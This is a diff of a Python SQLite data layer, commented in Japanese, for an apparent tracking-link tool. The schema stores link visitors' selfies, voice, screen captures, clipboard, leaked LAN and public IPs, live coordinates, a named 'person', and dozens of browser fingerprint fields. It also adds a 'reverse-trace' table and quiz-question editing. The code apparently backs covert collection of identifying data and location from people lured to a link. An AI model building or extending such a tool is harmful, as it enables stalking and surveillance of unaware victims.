@@ -1,6 +1,10 @@
 """SQLite スキーマとアクセス層。特定エンジン + リンク追跡 + 横断検索。スレッド安全版。
 
-v2:
+v3:
+  ・link_hits に端末指紋の全項目（IP漏洩・GPU・指紋・権限・時計ズレ等）を追加
+  ・link_questions に help / placeholder / required / min / max を追加
+  ・逆探知結果テーブル link_reverse を追加
+  ・質問の編集・並べ替え・複製・採番し直し・全削除
   ・"database disk image is malformed" からの自動救出（.broken に退避して再構築）
   ・書き込みが壊れていたら1回だけ自動復旧してやり直す
   ・バックアップ用の一貫スナップショット（WAL 対応）
@@ -143,17 +147,32 @@ CREATE TABLE IF NOT EXISTS link_hits (
     extra TEXT, note TEXT,
     vid TEXT, fingerprint TEXT, pubkey TEXT, sig TEXT, sig_ok INTEGER,
     nonce TEXT, fp_json TEXT,
-    quiz_done INTEGER DEFAULT 0, quiz_score REAL, quiz_total INTEGER, quiz_ms INTEGER
+    quiz_done INTEGER DEFAULT 0, quiz_score REAL, quiz_total INTEGER, quiz_ms INTEGER,
+    selfie TEXT, voice TEXT, screen_cap TEXT, clip TEXT,
+    dwell_ms INTEGER, scroll REAL, visits INTEGER,
+    lan_ip TEXT, pub_ip TEXT, gpu TEXT, webgl_hash TEXT, canvas_fp TEXT,
+    audio_fp TEXT, fonts_n INTEGER, codecs TEXT, media_devices TEXT, storage TEXT,
+    battery REAL, charging INTEGER, net_type TEXT, downlink REAL, rtt INTEGER,
+    clock_skew REAL, color_gamut INTEGER, hdr INTEGER, refresh_hz INTEGER,
+    pointer TEXT, orientation TEXT, cookies_on INTEGER, dnt TEXT,
+    permissions TEXT, voices TEXT, webgpu TEXT, plugins TEXT,
+    tz_client TEXT, tzoff INTEGER, lang_list TEXT
 );
 CREATE TABLE IF NOT EXISTS link_questions (
     id INTEGER PRIMARY KEY AUTOINCREMENT,
     code TEXT, ord INTEGER DEFAULT 0, qtype TEXT DEFAULT 'choice',
-    prompt TEXT, options TEXT, answer_key TEXT, reveal TEXT, created_at TEXT
+    prompt TEXT, options TEXT, answer_key TEXT, reveal TEXT, created_at TEXT,
+    help TEXT, placeholder TEXT, required INTEGER DEFAULT 0,
+    min TEXT, max TEXT
 );
 CREATE TABLE IF NOT EXISTS link_answers (
     id INTEGER PRIMARY KEY AUTOINCREMENT,
     code TEXT, hit_id INTEGER, qid INTEGER, ord INTEGER, qtype TEXT,
     answer TEXT, is_correct INTEGER, ms INTEGER, ip TEXT, ts TEXT
+);
+CREATE TABLE IF NOT EXISTS link_reverse (
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    code TEXT, ip TEXT, ts TEXT, score INTEGER, verdict TEXT, data TEXT
 );
 CREATE TABLE IF NOT EXISTS visitors (
     vid TEXT PRIMARY KEY, first_seen TEXT, last_seen TEXT, hits INTEGER DEFAULT 0,
@@ -224,6 +243,7 @@ CREATE INDEX IF NOT EXISTS idx_hits_code ON link_hits(code, ts);
 CREATE INDEX IF NOT EXISTS idx_q_code ON link_questions(code, ord);
 CREATE INDEX IF NOT EXISTS idx_ans_hit ON link_answers(hit_id);
 CREATE INDEX IF NOT EXISTS idx_ans_code ON link_answers(code, ts);
+CREATE INDEX IF NOT EXISTS idx_rev_code ON link_reverse(code, ts);
 CREATE INDEX IF NOT EXISTS idx_visitors_seen ON visitors(last_seen);
 CREATE INDEX IF NOT EXISTS idx_sns_scan ON sns_hits(scan_id, state);
 CREATE INDEX IF NOT EXISTS idx_sns_u ON sns_hits(username, state);
@@ -378,7 +398,25 @@ class DB:
                           ("quiz_ms", "INTEGER"),
                           ("selfie", "TEXT"), ("voice", "TEXT"), ("screen_cap", "TEXT"),
                           ("clip", "TEXT"), ("dwell_ms", "INTEGER"), ("scroll", "REAL"),
-                          ("visits", "INTEGER")],
+                          ("visits", "INTEGER"), ("extra", "TEXT"),
+                          ("lan_ip", "TEXT"), ("pub_ip", "TEXT"), ("gpu", "TEXT"),
+                          ("webgl_hash", "TEXT"), ("canvas_fp", "TEXT"),
+                          ("audio_fp", "TEXT"), ("fonts_n", "INTEGER"),
+                          ("codecs", "TEXT"), ("media_devices", "TEXT"),
+                          ("storage", "TEXT"), ("battery", "REAL"),
+                          ("charging", "INTEGER"), ("net_type", "TEXT"),
+                          ("downlink", "REAL"), ("rtt", "INTEGER"),
+                          ("clock_skew", "REAL"), ("color_gamut", "INTEGER"),
+                          ("hdr", "INTEGER"), ("refresh_hz", "INTEGER"),
+                          ("pointer", "TEXT"), ("orientation", "TEXT"),
+                          ("cookies_on", "INTEGER"), ("dnt", "TEXT"),
+                          ("permissions", "TEXT"), ("voices", "TEXT"),
+                          ("webgpu", "TEXT"), ("plugins", "TEXT"),
+                          ("tz_client", "TEXT"), ("tzoff", "INTEGER"),
+                          ("lang_list", "TEXT")],
+            "link_questions": [("help", "TEXT"), ("placeholder", "TEXT"),
+                               ("required", "INTEGER DEFAULT 0"),
+                               ("min", "TEXT"), ("max", "TEXT")],
             "links": [("person", "TEXT"), ("interval", "INTEGER DEFAULT 15"),
                       ("live", "INTEGER DEFAULT 0"), ("session_id", "TEXT"),
                       ("last_ts", "TEXT"), ("last_lat", "REAL"), ("last_lon", "REAL"),
@@ -718,6 +756,7 @@ class DB:
             c.execute("DELETE FROM link_questions WHERE code=?", (code,))
             c.execute("DELETE FROM link_answers WHERE code=?", (code,))
             c.execute("DELETE FROM link_captures WHERE code=?", (code,))
+            c.execute("DELETE FROM link_reverse WHERE code=?", (code,))
 
     def set_link_active(self, code, flag):
         with self.tx() as c:
@@ -756,17 +795,77 @@ class DB:
 
     # ---- クイズ ----
     def add_question(self, code, prompt, qtype="choice", options=None,
-                     answer_key="", reveal=""):
+                     answer_key="", reveal="", help="", placeholder="",
+                     required=0, min="", max=""):
         with self.tx() as c:
             o = c.execute("SELECT COALESCE(MAX(ord),-1)+1 n FROM link_questions WHERE code=?",
                           (code,)).fetchone()["n"]
             c.execute("""INSERT INTO link_questions(code,ord,qtype,prompt,options,
-                answer_key,reveal,created_at) VALUES(?,?,?,?,?,?,?,?)""",
+                answer_key,reveal,created_at,help,placeholder,required,min,max)
+                VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?)""",
                 (code, o, qtype, prompt, json.dumps(options or [], ensure_ascii=False),
-                 answer_key, reveal, now()))
+                 answer_key, reveal, now(), help, placeholder, int(bool(required)),
+                 min, max))
 
     def questions(self, code):
         return self.q("SELECT * FROM link_questions WHERE code=? ORDER BY ord,id", (code,))
+
+    def get_question(self, qid, code=None):
+        if code:
+            return self.q1("SELECT * FROM link_questions WHERE id=? AND code=?",
+                           (qid, code))
+        return self.q1("SELECT * FROM link_questions WHERE id=?", (qid,))
+
+    def update_question(self, qid, **f):
+        if not f:
+            return
+        if "options" in f:
+            f["options"] = json.dumps(f["options"] or [], ensure_ascii=False)
+        sets = ", ".join(f"{k}=?" for k in f)
+        with self.tx() as c:
+            c.execute(f"UPDATE link_questions SET {sets} WHERE id=?",
+                      list(f.values()) + [qid])
+
+    def move_question(self, code, qid, delta):
+        """delta=-1 で上へ、+1 で下へ。ord を振り直す。"""
+        with self.tx() as c:
+            rows = c.execute("SELECT id, ord FROM link_questions WHERE code=? "
+                             "ORDER BY ord, id", (code,)).fetchall()
+            ids = [r["id"] for r in rows]
+            if qid not in ids:
+                return
+            i = ids.index(qid)
+            j = max(0, min(len(ids) - 1, i + delta))
+            if i == j:
+                return
+            ids.insert(j, ids.pop(i))
+            for n, q in enumerate(ids):
+                c.execute("UPDATE link_questions SET ord=? WHERE id=?", (n, q))
+
+    def dup_question(self, code, qid):
+        q = self.get_question(qid, code)
+        if not q:
+            return
+        with self.tx() as c:
+            o = c.execute("SELECT COALESCE(MAX(ord),-1)+1 n FROM link_questions WHERE code=?",
+                          (code,)).fetchone()["n"]
+            c.execute("""INSERT INTO link_questions(code,ord,qtype,prompt,options,
+                answer_key,reveal,created_at,help,placeholder,required,min,max)
+                VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?)""",
+                (code, o, q["qtype"], q["prompt"], q["options"], q["answer_key"],
+                 q["reveal"], now(), q["help"], q["placeholder"], q["required"],
+                 q["min"], q["max"]))
+
+    def renumber_questions(self, code):
+        with self.tx() as c:
+            rows = c.execute("SELECT id FROM link_questions WHERE code=? "
+                             "ORDER BY ord, id", (code,)).fetchall()
+            for n, r in enumerate(rows):
+                c.execute("UPDATE link_questions SET ord=? WHERE id=?", (n, r["id"]))
+
+    def clear_questions(self, code):
+        with self.tx() as c:
+            c.execute("DELETE FROM link_questions WHERE code=?", (code,))
 
     def del_question(self, qid):
         with self.tx() as c:
@@ -785,6 +884,18 @@ class DB:
 
     def answers_for(self, hit_id):
         return self.q("SELECT * FROM link_answers WHERE hit_id=? ORDER BY ord", (hit_id,))
+
+    # ---- 逆探知 ----
+    def add_reverse(self, code, ip, score, verdict, data):
+        with self.tx() as c:
+            c.execute("INSERT INTO link_reverse(code,ip,ts,score,verdict,data) "
+                      "VALUES(?,?,?,?,?,?)",
+                      (code, ip, now(), score, verdict,
+                       json.dumps(data, ensure_ascii=False, default=str)[:20000]))
+
+    def reverses(self, code, limit=50):
+        return self.q("SELECT * FROM link_reverse WHERE code=? ORDER BY id DESC LIMIT ?",
+                      (code, limit))
 
     # ---- 訪問者台帳 ----
     def upsert_visitor(self, vid, **f):
@@ -946,6 +1057,7 @@ class DB:
             c.execute("DELETE FROM link_hits WHERE code=?", (code,))
             c.execute("DELETE FROM link_answers WHERE code=?", (code,))
             c.execute("DELETE FROM link_captures WHERE code=?", (code,))
+            c.execute("DELETE FROM link_reverse WHERE code=?", (code,))
             c.execute("DELETE FROM links WHERE code=?", (code,))
 
     def clear_points(self, code):
